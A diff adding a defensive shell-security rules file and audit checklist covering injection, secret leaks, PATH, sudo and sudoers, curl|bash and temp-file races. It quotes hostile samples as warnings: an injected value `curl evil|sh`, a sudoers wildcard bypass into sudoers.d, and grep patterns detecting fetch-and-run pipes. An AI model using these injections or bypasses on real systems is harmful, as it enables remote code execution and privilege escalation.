@@ -1,0 +1,426 @@
+# 03 — Security
+
+Injection, secrets, privilege, supply chain, and the tooling gate. Severity here skews
+CRITICAL/HIGH — shell runs with the operator's full authority.
+
+## 1. eval and command injection
+
+`eval` on anything derived from input (args, env, file contents, API responses) is
+arbitrary code execution. So are its cousins: `bash -c "$str"`, `sh -c "$str"`,
+`ssh host "$str"`, `su -c`, `watch "$str"`, `find -exec sh -c "$str"`, awk `system()`,
+unquoted heredoc bodies fed to a shell.
+
+```bash
+# CRITICAL — filename/branch/issue-title chosen by user executes code
+eval "git checkout $branch"
+bash -c "process $file"
+ssh "$host" "rm -rf $dir"            # remote shell re-parses; $dir='/; curl evil|sh'
+
+# GOOD — no re-parsing: pass data as arguments, not code
+git checkout -- "$branch"
+process "$file"
+ssh "$host" -- rm -rf -- "$(printf '%q' "$dir")"   # %q-escape anything entering a remote shell;
+# `--` so a $dir starting with '-' is not an option. %q is BASH quoting: a newline becomes
+# $'…', which dash misparses (measured) — the remote login shell must be bash/zsh
+# better: scp a script and run it, or use ssh host 'cat | bash' with a heredoc of CODE ONLY
+```
+
+- Indirection without eval: `${!varname}` (bash), `declare -n` nameref, associative-array
+  dispatch `"${handlers[$key]}"` with a validated key — never `eval "$cmd_string"`.
+- Variables expanded inside `awk`/`sed`/`jq` *programs* are injection too:
+  `awk "{print \$$col}"` with col='1; system("...")'. Pass data via `awk -v`,
+  `jq --arg`, `sed` with validated patterns.
+- Anything matching `$(...)` or backticks inside user-controlled strings that later get
+  expanded in double quotes by `eval`/`envsubst`-like flows is the same bug.
+- `trap` re-parses its string when it fires, so a double-quoted body expands at definition and
+  then runs that text as code: stale values, or injection. Single-quote it (ShellCheck SC2064).
+
+## 2. Secrets discipline
+
+Three leak channels: **argv** (visible in `ps`/`/proc/*/cmdline` to all users), **environment
+dumps** (`env` in logs, crash handlers, CI debug, `/proc/*/environ`), **trace output**
+(`set -x` prints expanded values).
+
+```bash
+# CRITICAL — expanded values land in argv, visible to every local user via ps
+curl -H "Authorization: Bearer $TOKEN" https://api.example.com
+mysql -u app -p"$DB_PASS"
+
+# GOOD — secrets via file or stdin/fd, never argv
+curl --config - <<EOF
+header = "Authorization: Bearer $TOKEN"
+EOF
+# or: curl -H @"$header_file"
+mysql --defaults-extra-file="$cnf_with_password"
+
+# GOOD — read from a secrets file/manager at runtime
+TOKEN=$(<"$CREDENTIALS_DIR/token")    # file mode 0600, never committed
+```
+
+- `set -x`/`bash -x` prints every expansion. Bracket sensitive sections:
+
+```bash
+set +x   # SECRETS BELOW — do not trace
+auth_header="Authorization: Bearer $(<"$token_file")"
+set -x
+```
+
+  Better: keep `set -x` behind a debug flag and structure code so secrets never pass
+  through traced lines (files/fds end to end).
+- **Debugging from outside bypasses that guard.** `sh -x script.sh`, run to find why a job
+  exits silently, traces every line the script's author never bracketed — including a
+  presence test: `[ -n "$SECRET_KEY" ]` is printed with the value expanded. In a container
+  that trace is stdout, which a log shipper persists. Field-reported 2026-09-26: an object-store
+  key printed this way had to be rotated. Trace a throwaway copy with the credential lines cut
+  or bracketed, or turn `set -x` on after them — never the live script against real secrets.
+- Never `env`, `printenv`, `set`, or `declare -p` into logs in scripts that may hold
+  secrets in env. Never echo secrets even "masked" — write "loaded credentials from X".
+- CI: rely on the CI's secret masking but don't trust it — masking fails on transformed
+  values (base64, URL-encoded). Don't `base64` a secret into logs.
+- Storage/rotation strategy → [`sota-secrets-management`](../../sota-secrets-management/SKILL.md).
+
+### 2a. An assignment prefix does not reach a process substitution
+
+The idiom for keeping a secret out of `ps` is to pass it in the environment rather than in
+argv. It has a hole exactly where a helper produces the secret, and the failure is silent —
+the helper runs, the command succeeds, and the value it needed was never set.
+
+The shell sets up `<(helper)` **before** running the command, and an assignment prefix
+applies only to *that command's* environment. So the helper is not a child of the command
+carrying the variable:
+
+```console
+$ MY_VAR=secret cat <(./show-my-var)     # MY_VAR=UNSET   <- the helper never sees it
+$ MY_VAR=secret ./show-my-var            # MY_VAR=secret  <- control: prefixes do work
+$ ( export MY_VAR=secret; ./show-my-var )  # MY_VAR=secret
+```
+
+Measured 2026-09-13 in **bash and zsh alike** — the control line is what makes the first
+result evidence rather than a broken helper. It bites hardest when the variable *is the whole
+point*: `VAR=token curl --data @<(build-body)` sends a body built without the token, and
+`curl` still exits 0.
+
+- **Export in a subshell and redirect to a file**, or use a pipe — both put the helper in the
+  environment's scope: `( export TOKEN=…; build-body ) > body.json`.
+- **Do not reach for `env VAR=… cmd`** as the fix: it puts the value back into `env`'s own
+  argv, which is the exposure the idiom existed to avoid.
+- **A helper that silently produced an unauthenticated result is the failure mode** — have it
+  fail loudly on a missing variable (`: "${TOKEN:?TOKEN not set}"`) rather than emit a body
+  without it.
+
+## 3. PATH hygiene and privileged scripts
+
+Any script running as root (cron, sudo, init, setuid wrappers' children) must not trust
+the inherited environment:
+
+```bash
+# top of privileged scripts
+PATH=/usr/sbin:/usr/bin:/sbin:/bin
+export PATH
+umask 077
+unset IFS CDPATH ENV BASH_ENV GLOBIGNORE LD_PRELOAD LD_LIBRARY_PATH
+```
+
+- Attack: attacker-writable dir earlier in PATH (or `.` in PATH) shadows `tar`, `service`,
+  etc. Root cron with inherited PATH = privilege escalation.
+- `CDPATH` makes bare `cd dir` jump to unexpected locations — unset it in all scripts
+  (or always `cd ./dir`); check every `cd` (`cd "$dir" || die ...` — under `set -e` a
+  failed `cd` in a condition context still proceeds).
+- Never execute relative commands from a CWD you don't control; never `source` files
+  writable by less-privileged users.
+
+### 3a. The wrapper that shadows what it calls
+
+§3 above is the attacker's version: a directory *they* control, early in `PATH`, shadowing
+a command *you* call. The mirror is not adversarial and is far easier to ship by accident:
+**a directory you control, holding a file you wrote, that shadows a command your own file
+calls.**
+
+**Rule: inside an interceptor, never invoke a name the interceptor's own namespace can
+resolve back to itself.**
+
+Three namespaces, one bug — but **two different failure modes**, and the difference decides
+whether you find out safely (all measured 2026-09-10 on macOS):
+
+| namespace | recursion bound | what you see |
+|---|---|---|
+| **`PATH` shims** — a dir of fake/wrapping executables placed first on `PATH` (test harnesses, compiler caches, CI interceptors) | **none of any kind** | each level is a new **process**: the per-user process table fills, and every tool fails at once, *including the ones you need to diagnose it* ([`rules/08`](08-ad-hoc-side-effects.md) §4) |
+| **shell function overrides** — `curl() { … curl "$@"; }` in a profile; the inner `curl` resolves to the function again | bash: `FUNCNEST`, **unset by default** → `f(){ f; }; f` exits **139 (SIGSEGV)**. zsh: `FUNCNEST` defaults to **700** → clean `maximum nested function level reached`, exit 1 | one process, dying as a crash or an error |
+| **aliases and `LD_PRELOAD`** | none | same shape as the shim: a new process per level |
+
+**The trap in that table is that the middle row is the one you will try first.** A function
+override blows up immediately and locally, which reads as "the shell protects me from this
+mistake". It does not: the same mistake in a `PATH` shim has no bound at all, takes the
+whole machine's process table, and `bash`'s own protection for the case that *is* bounded is
+**off unless you set it**.
+
+**Safe forms:**
+
+- use only **builtins** and parameter expansion inside the wrapper — prefix strip, `case`,
+  `test` — and call nothing external at all;
+- or call the real binary by **absolute path**, resolved once when the wrapper is generated,
+  never by bare name;
+- or drop the shim directory from `PATH` for the inner call:
+  `PATH=$ORIG_PATH command sed …`;
+- in shell functions use `command foo` / `builtin foo`, never bare `foo` (verified:
+  `echo(){ builtin echo "WRAPPED: $*"; }` terminates and prints once).
+
+**The review question, which is what makes this checkable:** *for every command this wrapper
+invokes, is that name also present in the directory the wrapper lives in — or in any
+namespace this wrapper installs into?*
+
+**Two diagnostic notes, because this failure fights back.**
+
+`pkill` cannot win a race against a live respawner — field-measured counts went **429 →
+1,276 while killing**. Killing the children of an active spawner is theatre. Group by parent
+(`ps -axo ppid=,comm=`) and neutralise *that*. **Sequential PIDs with one child each is the
+signature of a recursion**; a pool is one parent with many children.
+
+And **do not accept blame for a system-level symptom before checking parentage.** In the
+incident above, many backgrounded wait loops had been started in the same hour, so that
+story fit — and was written up as fact — before any `ps` showed a parent. The processes were
+`/bin/sh` running the shim; the wait loops would have been `zsh`, `sleep` and `pgrep`. One
+`ps -axo pid=,ppid=,command=` separates them. **A plausible culprit you already have in mind
+is exactly when to demand the evidence, not when to skip it** — and note that the evidence
+here was already in hand and misread: `/bin/sh` was never consistent with a `zsh` wait loop.
+
+**Generating a wrapper from a template has two escaping layers.** The warning comment written
+to prevent a repeat of this bug contained `${a#@}`; the template was rendered with Python's
+`str.format`, which reads `{a#@}` as a format field and raises `KeyError: 'a#@'` (verified —
+it fails identically inside a `#` comment, because the outer layer has no idea what a shell
+comment is). Double the braces or use a templating step that does not scan comments.
+
+## 4. sudo discipline
+
+- Scripts should not contain blanket `sudo`. If elevation is needed, either (a) require
+  the *whole script* to run as root and check it:
+
+```bash
+(( EUID == 0 )) || die "must run as root (try: sudo $0)"
+```
+
+  or (b) sudo *specific, full-path* commands with *fixed* arguments, and document the
+  needed sudoers entries. Anything the caller varies goes through a root-owned wrapper
+  that takes **no arguments** (`""` in sudoers = "no arguments allowed"):
+
+```
+deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart myapp, /usr/local/sbin/myapp-install-config ""
+```
+
+```sh
+#!/bin/sh
+# /usr/local/sbin/myapp-install-config — root:root 0755, in a root-owned directory.
+# No arguments; the new config arrives on stdin, which the CALLER opened, so root
+# never resolves a path the caller chose. Usage: sudo myapp-install-config < app.conf
+set -eu
+tmp=$(mktemp /etc/myapp/.myapp.conf.XXXXXX)
+trap 'rm -f -- "$tmp"' EXIT
+cat > "$tmp"
+chmod 0644 "$tmp"
+mv -f -- "$tmp" /etc/myapp/myapp.conf
+```
+
+- **Never `*` in sudoers command *arguments*.** sudoers(5): in arguments a wildcard
+  "can match any character, including white space", and a slash "does get matched"
+  (only the command's *path* part stops at `/`). Measured on sudo 1.9.13 (2026-09-26),
+  `/usr/bin/install -m644 * /etc/myapp/*` permits
+  `install -m644 /tmp/evil /etc/myapp/../sudoers.d/evil` — a root-owned sudoers drop-in.
+  Since **sudo 1.9.10** an argument may be a POSIX ERE anchored `^…$`
+  (`/usr/bin/install ^-m644 /srv/myapp/release/[a-z0-9_-]+\.conf /etc/myapp/[a-z0-9_-]+\.conf$`
+  denied the `..` and extra-operand variants in the same run), but it still lets root
+  follow a **symlink** the caller planted in a caller-writable source directory — that
+  run copied `/etc/shadow` to a world-readable file. Only use it with a root-owned
+  source; otherwise use the wrapper
+  ([sudoers(5)](https://www.sudo.ws/docs/man/sudoers.man/), "Wildcards" and "Regular expressions").
+
+- Never `sudo $cmd` with variable command (injection + sudoers bypass), never
+  `echo "$pass" | sudo -S` (secret in argv/pipe + defeats auth design).
+- Beware `sudo cmd > file`: the redirect happens in the *unprivileged* shell. Use
+  `... | sudo tee file >/dev/null` or `sudo sh -c '... > file'` with a constant string.
+- Drop privileges as early as possible; in containers prefer entrypoint-level drop
+  ([rules/04](04-ci-and-operational.md) §2) over sudo at all.
+
+## 5. curl | bash — both directions
+
+**Consuming** (you install third-party software):
+
+```bash
+# CRITICAL in production paths — executes whatever the server (or MITM, or compromised
+# bucket) returns; partial download can execute a truncated script
+curl -s https://example.com/install.sh | bash
+```
+
+Download → verify → execute, with pinned checksum (or signature) committed to your repo:
+
+```bash
+readonly url="https://github.com/org/tool/releases/download/v1.2.3/tool-linux-amd64"
+readonly sha256="4f5e...committed-constant..."
+tmp=$(mktemp)
+curl --fail --silent --show-error --location --max-time 120 \
+  --proto '=https' --tlsv1.2 -o "$tmp" -- "$url"
+printf '%s  %s\n' "$sha256" "$tmp" | sha256sum -c - || die "checksum mismatch for $url"
+install -m 0755 -- "$tmp" /usr/local/bin/tool
+```
+
+Pin versions (never `/latest/`); for higher assurance verify signatures
+(`gpg --verify`, cosign/minisign) not just checksums fetched from the same origin.
+
+**`--location` follows a downgrade unless you forbid it.** curl's default redirect set is
+HTTP, HTTPS, FTP and FTPS, so an `https://` URL that redirects to `http://` is fetched in
+plaintext at exit 0. `--proto '=https'` refuses that, both for a plain-`http` URL and in a
+redirect. The man page says `--proto-redir` cannot re-allow what `--proto` denies, so with
+`--proto` set you don't also need `--proto-redir '=https'`. `--tlsv1.2` sets the *minimum*
+TLS version. Measured on curl 8.7.1 (2026-10-13), https→http redirect: no flag, exit 0;
+`--proto '=https'` alone, `Protocol "http" disabled (in redirect)`, exit 1. A checksum
+catches a tampered *artifact* but not a plaintext fetch of a script that is not pinned.
+
+**Publishing** (you ship an install script): provide versioned artifacts + a checksums
+file signed or served from a separate trust path; make the script safe under truncation
+by wrapping everything in a function called on the last line:
+
+```bash
+main() { ...all logic...; }
+main "$@"   # nothing executes until fully downloaded and parsed
+```
+
+## 6. Temp file races and umask
+
+- Predictable temp paths (`/tmp/myapp.$$`, `/tmp/build.tmp`) → symlink attack: attacker
+  pre-creates a symlink at that path, your root script writes through it onto
+  `/etc/passwd`. **Only `mktemp`** (unpredictable name, `O_EXCL`, mode 0600) — already
+  required by [rules/05](05-constructs-and-cleanup.md) §3; here it is a security control, not hygiene.
+- Don't `chmod` a file *after* writing sensitive content — create restrictive, then write:
+  `umask 077` before creating key material, or `install -m 0600 /dev/null "$f"` then write.
+- Set `umask` explicitly in scripts that create files whose permissions matter; inherited
+  umask is whatever the caller had. `umask 022` for world-readable artifacts, `077` for
+  private state. Remember [rules/02](02-robustness-correctness.md) §9: mktemp files are 0600 — explicitly `chmod` before
+  publishing world-readable artifacts via `mv`.
+- Shared directories: never trust pre-existing files/dirs in `/tmp`; `mktemp -d` and work
+  inside it.
+
+## 7. ShellCheck + shfmt in CI — non-negotiable
+
+Use the latest stable ShellCheck and shfmt (verify at github.com/koalaman/shellcheck/releases
+and github.com/mvdan/sh/releases); shfmt parses zsh (partially) since v3.13.
+Both are single static binaries; there is no excuse for a repo with shell scripts and no
+shell linting.
+
+```yaml
+# CI job (any system) — fail the build on findings
+- run: |
+    git ls-files -z '*.sh' '*.bash' | xargs -0 shellcheck --severity=style --external-sources --enable=check-set-e-suppressed,check-extra-masked-returns,check-unassigned-uppercase
+    shfmt -d -i 2 -ci .          # -i 2 is an EXAMPLE — indent width is the repo's to set
+```
+
+`-z | xargs -0`, not `shellcheck $(git ls-files …)`: the substitution splits a path with a
+space into two missing files. With an **empty** list GNU xargs still runs `shellcheck` with
+no files (exit 3, fails closed) while BSD/macOS xargs runs nothing and exits 0 — measured
+2026-09-26. The two `--enable` names are **optional** checks (`shellcheck --list-optional`)
+that give [rules/01](01-safety-baseline.md) §2 a static detector: `check-set-e-suppressed` (SC2310 — function called
+in an `if`/`&&` condition; SC2311 — in `$(…)`, where `set -e` is off) and
+`check-extra-masked-returns` (SC2312 — a command's status masked, e.g. `rm -r "$(f)/home"`).
+SC2312 is noisy; adopt it with a baseline rather than drop it.
+
+**By default ShellCheck does not report an unset ALL-CAPS name, so the lint passes a `set -u` typo.**
+SC2154 ("referenced but not assigned") skips any name with no lowercase letter, on the
+assumption that it comes from the environment. Measured on ShellCheck 0.11.0: `${CONTAINER}`,
+`${C}`, `${CONTAINER_1}` and `${_X}` pass silently while `${Container}` and `${X_y}` are flagged,
+and `bash -n` passes too. The script then dies at run time with `CONTAINER: unbound variable`, on
+the first path that reaches the line (field-reported 2026-10-21). The optional
+`check-unassigned-uppercase` reports all four. Enable it, and give each real environment input a
+default (`${NAME:-}`) or a guard (`: "${NAME:?NAME must be set}"`), which the check accepts. This
+library's own CI scripts gave 0 findings with it on (2026-10-22), so the cost is low where inputs
+are already read that way. Naming script-internal variables in lowercase helps, but only the check enforces it.
+
+**Verifying a gate locally is a different question, and another skill owns it:**
+[`sota-devsecops` rules/11](../../sota-devsecops/rules/11-after-the-gate-fails.md) §5 — *reproduce the gate's exact invocation, not an equivalent*.
+Worth the jump from here, because the shell-shaped version of that mistake is expensive:
+`-i 2` above is an example, and in a repo that indents shell with **4** spaces a contributor
+who copies it verbatim does not just get a false failure — `shfmt` is usually run with `-w`
+somewhere nearby, so it **reformats every shell file in the tree**.
+
+**And `--severity=style` is not fussiness — a style finding can be a live defect.** SC2006
+("use `$(...)` instead of backticks") is classed *style*, and it has flagged backticks
+written inside an unquoted `cat <<USAGE` heredoc, where they are **live command
+substitution in help text** rather than literal characters. `--severity=error` ships that.
+
+- Also lint scripts *embedded* elsewhere: Dockerfile `RUN` blocks (hadolint integrates
+  ShellCheck), GitHub Actions `run:` blocks (actionlint embeds ShellCheck), Makefile
+  recipes (extract or keep recipes one-line calling real scripts).
+- Suppressions only inline, narrowest scope, with justification:
+
+```bash
+# shellcheck disable=SC2086  # $FLAGS is a space-separated allowlist built above, splitting intended
+```
+
+  Repo-wide disables in `.shellcheckrc` for *bug-class* codes (SC2086, SC2046, SC2155,
+  SC2064) are an audit finding in themselves.
+- shfmt settings belong in `.editorconfig` so editor, hook, and CI agree.
+
+## Audit checklist
+
+- [ ] **Any secret passed as an assignment prefix to a command using `<(…)`?** (§2a) The
+      prefix does not reach the process substitution — measured in bash and zsh — so the
+      helper runs without it and the command still exits 0. Export in a subshell or use a
+      pipe; never `env VAR=… cmd`, which returns the value to argv.
+
+- [ ] **Linters invoked the way the gate invokes them** (§7) — flags and file selection read out
+      of the hook/CI config ([`sota-devsecops` rules/11](../../sota-devsecops/rules/11-after-the-gate-fails.md) §5, which owns this); a mismatched
+      `shfmt -i` is a false failure at best and, with `-w` nearby, a whole-tree reformat
+- [ ] **ShellCheck run at `--severity=style`**, not `error` (§7): SC2006 is *style* and catches
+      backticks inside an unquoted heredoc, which are live command substitution
+- [ ] **`set -e`-suppression checks enabled** (§7): `--enable=check-set-e-suppressed,check-extra-masked-returns`
+      (SC2310/SC2311/SC2312) in the gate, or an equivalent `enable=` in `.shellcheckrc`; absent → MEDIUM
+      for any script relying on `set -e`
+- [ ] **Unset ALL-CAPS names checked** (§7): `--enable=check-unassigned-uppercase` in the gate; absent
+      → LOW, or MEDIUM for a `set -u` script that reads ALL-CAPS names with no `${NAME:-}`/`${NAME:?}`.
+      To find what the default lint missed, run `shellcheck -f gcc --enable=check-unassigned-uppercase <file>`
+      and compare its SC2154 lines with a run without the flag
+
+- [ ] **Interceptor recursion** (§3a): does any wrapper, shim, alias or shell-function
+      override invoke a command name that its **own namespace shadows**? For each wrapper,
+      list the commands it calls and check each against the wrapper's own directory.
+- [ ] If a wrapper must call out (§3), does it use an **absolute path** resolved at generation
+      time, a `PATH` with the shim directory removed, or `command`/`builtin` in a function —
+      never a bare name? Note the function form is bounded (bash `FUNCNEST`, **unset by
+      default** → SIGSEGV; zsh 700) while the `PATH`-shim form is **not bounded at all**.
+- [ ] For scripts generated from templates (§3): does the outer templating layer treat **comments**
+      as literal text? A `${a#@}` inside a `#` comment still raises `KeyError` under Python
+      `str.format`.
+
+- [ ] `grep -rn 'eval ' --include='*.sh'` → every hit CRITICAL until proven constant-input
+      (SC2294 hints at array-eval misuse) (§1).
+- [ ] `grep -rn 'bash -c\|sh -c' --include='*.sh' --include='Makefile*' --include='Dockerfile*' --include='*.mk' .` with `$` inside (§1)
+      the string → CRITICAL/HIGH.
+- [ ] `ssh .*\$` and `su -c .*\$` — remote re-parsing injection; check for `printf '%q'` (§1). A variable inside a double-quoted
+      `awk`/`sed`/`jq` program instead of `awk -v`/`jq --arg`: `grep -rnE '(awk|jq|sed)([[:space:]]+-[a-zA-Z]+)*[[:space:]]+"' --include='*.sh' .`
+      (a locator: a constant double-quoted program is a false positive; 4/4 bad, 0/4 good, BSD grep and ugrep).
+- [ ] SC2064 — `trap "$cmd" ...` with double quotes (§1) (expands now, runs later — often
+      stale/injected values).
+- [ ] Secrets in argv (§2): `grep -rni 'password\|token\|secret\|api[_-]key' --include='*.sh'`
+      then trace each into argv (`-p"$X"`, `-H "Auth.* $X"`, URL userinfo `https://user:$X@`)
+      → CRITICAL.
+- [ ] `set -x` (or `bash -x` in shebang/CI) in scripts handling secrets without `set +x`
+      bracketing → HIGH (§2); also a debug `sh -x script` run against live secrets, which traces lines nobody bracketed.
+- [ ] `env\|printenv\|declare -p` piped to logs/files in secret-bearing contexts (§2); a secret `base64`- or URL-encoded into logs, which CI masking misses.
+- [ ] Privileged scripts (cron files, `sudo` callers, Docker root entrypoints) missing
+      explicit `PATH=` and `umask` → HIGH; `CDPATH` not unset → MEDIUM (§3). Also: `IFS`, `ENV`, `BASH_ENV`, `LD_PRELOAD`
+      and the rest of §3's list not unset; an unchecked `cd` (SC2164); `source` of a file a less-privileged user can write.
+- [ ] `grep -rn 'sudo ' --include='*.sh'` (§4) — variable after sudo, `sudo -S`, blanket sudo,
+      `sudo .* >` redirects.
+- [ ] Documented or shipped sudoers entries: any `*` in a command's **arguments** → HIGH
+      (it matches `/` and spaces — §4); an argument `^…$` regex over a caller-writable path → HIGH.
+- [ ] `grep -rn 'curl[^|]*|[[:space:]]*\(ba\)\?sh\|wget -qO- .*| *sh' -r .` → CRITICAL in
+      anything that runs unattended; check install scripts for checksum/signature
+      verification and version pinning (no `/latest/`); a script you ship wraps all logic in a function called only on its last line (§5 Publishing).
+- [ ] A redirect-following fetch with no protocol floor (§5): `grep -rnE 'curl[^#]*(-[a-zA-Z]*L|--location)' --include='*.sh' . | grep -v -e '--proto[ =]'`
+      → MEDIUM (HIGH if the fetched script is executed and not pinned by checksum): add
+      `--proto '=https' --tlsv1.2`. `--proto-redir` alone does not count. Built on a labelled set
+      (5/5 bad caught, 0/6 good flagged, BSD grep and ugrep, 2026-10-13).
+- [ ] Predictable temp names: `grep -rn '/tmp/[^$]*\$\$\|/tmp/[a-zA-Z0-9._-]*\b' --include='*.sh'`
+      without mktemp → HIGH (CRITICAL if script runs as root) (§6).
+- [ ] `chmod .*60[0]\|chmod .*7[07][07]` *after* content written to sensitive files (§6); no explicit `umask` where created files' permissions
+      matter; work done in pre-existing `/tmp` paths rather than inside a fresh `mktemp -d`.
+- [ ] No shellcheck/shfmt in CI config (§7) (`.github/workflows`, `.gitlab-ci.yml`,
+      `Jenkinsfile`) for a repo containing `*.sh` → HIGH (process gap).
+- [ ] `.shellcheckrc` blanket-disabling (§7) SC2086/SC2046/SC2155/SC2064 → finding.
